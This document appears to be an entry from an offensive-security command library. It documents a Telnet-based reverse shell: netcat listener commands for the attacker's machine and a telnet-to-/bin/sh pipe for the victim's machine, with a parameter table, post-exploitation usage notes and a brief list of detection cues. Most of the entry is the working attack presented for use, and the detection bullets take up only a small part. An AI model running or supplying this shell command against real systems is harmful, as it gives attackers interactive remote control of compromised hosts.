---
id: 9a65f4d8-a2e3-4d8c-bfc0-1ca3c12db5dc
name: Telnet-Reverse-Shell-Bash-Script
type: code
language: Bash
verified: true
created_at: '2023-04-06T03:56:24.592432+00:00'
updated_at: '2023-04-10T20:25:31.632436+00:00'
platforms:
  - Linux
  - Unix
tags:
  - reverse-shell
  - telnet
  - c2
validated: true
---

# Telnet-Reverse-Shell-Bash-Script

## Code

```bash
In Attacker machine start two listeners:
nc -lvp 8080
nc -lvp 8081

In Victime machine run below command:
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```

## Description

This Bash script snippet outlines the complete setup for a Telnet-based reverse shell, including starting dual Netcat listeners on the attacker machine and executing the piping command on the victim. It enables interactive command execution over unencrypted Telnet connections.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <Your_IP> | IP address of the attacker's machine (replace with actual IP) | 192.168.1.100 |
| 8080 | First listener port for input | 8080 |
| 8081 | Second listener port for output | 8081 |

## Usage

Save as a .sh file or execute inline. On attacker: Run the nc lines in separate terminals. On victim: Run the telnet pipe after listeners are active. Used in post-exploitation for gaining shell access without native reverse shell tools.

## Detection

- Network traffic monitoring for Telnet (port 23-like) or Netcat connections to high ports (8080/8081).
- Process monitoring for 'telnet' or 'nc' executions with piping.
- Endpoint logs showing /bin/sh spawned from telnet processes.
- Anomalous outbound connections from internal hosts.

## Related

- [[procedures/Telnet-Reverse-Shell]]
- [[commands/nc-start-dual-listeners-for-telnet-shell]]
- [[commands/telnet-pipe-shell-to-attacker]]
